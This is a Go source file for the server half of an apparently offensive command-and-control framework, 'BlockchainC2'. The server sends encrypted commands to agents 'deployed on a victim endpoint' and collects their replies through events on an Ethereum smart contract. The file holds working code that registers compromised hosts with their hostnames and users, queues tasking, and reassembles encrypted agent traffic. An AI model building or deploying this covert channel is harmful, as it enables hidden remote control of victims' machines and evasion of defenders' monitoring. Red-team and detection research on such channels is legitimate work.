package BlockchainC2

import (
	"blockchainc2/internal/pkg/Utils"
	"crypto/rsa"
	"encoding/json"
	"errors"
	"fmt"
	"math/big"
	"strings"
	"time"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
)

// BlockchainServer contains the current state of the server including
// cryptokeys and current associated agents
type BlockchainServer struct {
	Key             string
	Endpoint        string
	ContractAddress string
	outboundQueue   []string
	CipherKey       []byte
	Crypto          *rsa.PrivateKey

	// Our BC members
	Client        *ethclient.Client
	Auth          *bind.TransactOpts
	EventC2Client *EventC2
	EventChannel  chan *EventC2ServerData

	// Our Agent members
	Running bool

	// Server features
	Agents map[string]*Agent
}

// Agent describes an instance of a remote agent deployed on a victim endpoint
type Agent struct {
	AgentID     string // AgentID generated by the agent
	LastSeen    string // Timestamp of the last request sent by the agent
	Seq         int64  // Hold the agents last SEQ in the request
	OutSeq      int64  // Holds the servers last SEQ in a request
	UIHistory   string // UI buffer
	DataBuffer  string // Buffers inbound packets until they can be reconstructed
	SessionKey  []byte // Generated sessionkey for the agent
	CurrentUser string // Username executing the agent
	Hostname    string // Hostname of the agent
	Status      int    // Is the agent ready to receive commands
}

// GetAgentByID returns an Agent based on the ID provided
// If an Agent cannot be found, returns nil
func (bc *BlockchainServer) GetAgentByID(agentID string) *Agent {
	if bc.Agents[agentID] == nil {
		return nil
	}

	return bc.Agents[agentID]
}

// GetOrCreateAgent adds a new agent to our internal Agent store
// and returns the Agent for further processing
// If agent already exists, returns agent
func (bc *BlockchainServer) GetOrCreateAgent(agentID string) *Agent {
	if agent := bc.GetAgentByID(agentID); agent != nil {
		return agent
	}

	agent := &Agent{
		AgentID:  agentID,
		LastSeen: time.Now().Format("2006-01-02 15:04:05"),
		Seq:      0,
		OutSeq:   0,
		Status:   Handshake,
	}
	bc.Agents[agentID] = agent

	return agent
}

// GetAllAgents returns all known agents
func (bc *BlockchainServer) GetAllAgents() map[string]*Agent {
	return bc.Agents
}

// SendToAgent forwards the provided data to the specified Agent
func (bc *BlockchainServer) SendToAgent(agentID string, data string, msgID int, encrypt bool) error {

	// BlockchainC2 header sent with request
	command := BlockchainC2{
		AgentID: agentID,
		MsgID:   msgID,
		Data:    data,
	}

	// Make sure we actually have an agent in our registry
	agent := bc.GetAgentByID(agentID)
	if agent == nil {
		return errors.New("AgentID could not be found")
	}

	// Serialize our command into JSON to be sent over the Blockchain
	bytes, err := json.Marshal(command)
	if err != nil {
		return err
	}

	// Start unencrypted
	rawData := string(bytes)
	enc := false

	// If we have a valid session key set, we encrypt this data
	if agent.SessionKey != nil {
		rawData, err = Utils.SymmetricEncrypt(bytes, agent.SessionKey)
		if err != nil {
			return err
		}
		enc = true
	}

	// Increment out sequence check before sending data
	agent.OutSeq++

	// Send data to agent
	_, err = bc.EventC2Client.AddClientData(
		bc.Auth,
		agentID,
		rawData,
		big.NewInt(int64(agent.OutSeq)),
		true,
		enc,
	)
	if err != nil {
		return err
	}

	// Update the nonce value to allow sending of multiple requests before a block is mined
	bc.Auth.Nonce = bc.Auth.Nonce.Add(bc.Auth.Nonce, big.NewInt(1))

	return nil
}

// RecvFromAgentLoop handles incoming Blockchain events, reconstructs split data and forwards
// a BlockchainC2 object via the parameter channel
func (bc *BlockchainServer) RecvFromAgentLoop(o chan BlockchainC2) {

	for true {

		// Get an event from the blockchain
		var newEvent *EventC2ServerData = <-bc.EventChannel

		// Create or get agent instance
		agent := bc.GetOrCreateAgent(newEvent.AgentID)

		// Ensure that this is not a duplicate or an old event (happens unfortunately)
		if newEvent.Seq.Int64() <= agent.Seq {
			continue
		}

		// If we are due to handle this request, update the Seq we hold
		agent.Seq = newEvent.Seq.Int64()

		// Update agent data buffer
		agent.DataBuffer += newEvent.Data

		// Check if this is the final chunk of a request to process
		if newEvent.F {

			var c2 BlockchainC2

			// If encrypted, decrypt before processing
			if newEvent.Enc {
				raw, err := Utils.SymmetricDecrypt(agent.DataBuffer, agent.SessionKey)
				if err == nil {
					if err := json.Unmarshal([]byte(raw), &c2); err == nil {
						// Emit decrypted
						o <- c2
					}
				}
			} else {
				if err := json.Unmarshal([]byte(agent.DataBuffer), &c2); err == nil {
					// Emit decrypted
					o <- c2
				}
			}

			// Now we have processed a final chunk, clear the buffer
			agent.DataBuffer = ""
		}
	}
}

// CreateBlockchainServer is the entrypoint for a new server processing events from the blockchain from agents
// key - Keychain in JSON format
// password - Password to decrypt keychain
// endpoint - JSON-RPC endpoint for processing events
// contractAddress - Address of contract used for fwding/recving events
// gasPrice - Gas price to use during transactions (or 0 to let the client decide)
// nonce - Initial nonce value of the wallet, or -1 to use Infura's API
func CreateBlockchainServer(key string, password string, endpoint string, contractAddress string, gasPrice, nonce int64) (*BlockchainServer, error) {

	client := BlockchainServer{
		Key:             key,
		Endpoint:        endpoint,
		ContractAddress: contractAddress,
		CipherKey:       []byte("0123456789012346"),
	}

	// Initialise our Agent storage map
	client.Agents = map[string]*Agent{}

	// Create blockchain connection
	conn, err := ethclient.Dial(client.Endpoint)
	if err != nil {
		return nil, fmt.Errorf("Error connecting to endpoint: %v", err)
	}

	// Create a new transactopts to allow processing of transactions when sending events
	auth, err := bind.NewTransactor(strings.NewReader(client.Key), password)
	if err != nil {
		return nil, fmt.Errorf("Failed to create authorized transactor: %v", err)
	}

	// Set gas price if provided as a param
	if gasPrice != 0 {
		auth.GasPrice = big.NewInt(gasPrice)
	}

	// If a nonce value is not set, use the API from Infura to retrieve the last nonce used
	if nonce == -1 {
		nonce, err = GetCurrentTransactionNonce(auth.From.Hex())
		if err != nil {
			return nil, fmt.Errorf("Error getting latest transaction ID: %v", err)
		}
	}
	auth.Nonce = big.NewInt(nonce)

	// Create a new EventC2 handler
	eventc2, err := NewEventC2(common.HexToAddress(client.ContractAddress), conn)
	if err != nil {
		return nil, fmt.Errorf("Failed to create EventC2 instance: %v", err)
	}

	client.Client = conn
	client.Auth = auth
	client.EventC2Client = eventc2
	client.Running = true

	// Generate our RSA key to allow agents to send their session keys
	client.Crypto = Utils.GenerateAsymmetricKeys(2048)

	// Set up our event channel for receiving inbound events from agents from the blockchain
	client.EventChannel = make(chan *EventC2ServerData)
	opts := &bind.WatchOpts{}

	// Create our notification channel
	if _, err := eventc2.WatchServerData(opts, client.EventChannel); err != nil {
		return nil, fmt.Errorf("Error watching for events: %v", err)
	}

	return &client, nil
}
